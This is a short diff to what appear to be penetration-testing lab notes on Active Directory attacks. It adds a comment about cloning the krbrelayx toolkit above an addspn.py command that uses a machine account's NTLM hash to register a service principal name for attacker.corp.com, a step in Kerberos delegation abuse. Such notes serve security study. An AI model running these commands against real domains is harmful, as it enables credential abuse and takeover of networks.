@@ -71,6 +71,7 @@ nslookup appsrv01
 
       * Add an SPN for `attacker.corp.com` on `FILES01$`
         *   ```powershell
+            # git clone https://github.com/dirkjanm/krbrelayx.git
             python3 addspn.py -u "corp.com\FILES01$" -p aad3b435b51404eeaad3b435b51404ee:9aa7af9cb73fbb418adf1586e9686931 -s HOST/attacker.corp.com --additional 'dc01.corp.com'
             ```
 
